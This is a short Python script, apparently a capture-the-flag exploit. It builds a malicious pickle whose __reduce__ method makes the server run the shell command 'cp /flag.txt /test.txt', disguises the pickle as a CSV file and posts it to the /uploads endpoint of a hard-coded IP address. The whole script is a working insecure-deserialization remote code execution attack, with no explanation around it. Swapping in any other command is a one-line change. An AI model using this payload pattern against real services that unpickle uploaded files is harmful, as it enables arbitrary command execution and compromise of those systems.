import pickle, os
import requests

class RCE:
    def __reduce__(self):
        return os.system, ("cp /flag.txt /test.txt",)
    
pickledPayload = pickle.dumps(RCE())
open("out.csv", "wb").write(pickledPayload)
url = "http://13.229.150.169:33873"

r = requests.post(url + "/uploads", files={"dataset": open("out.csv", 'rb')})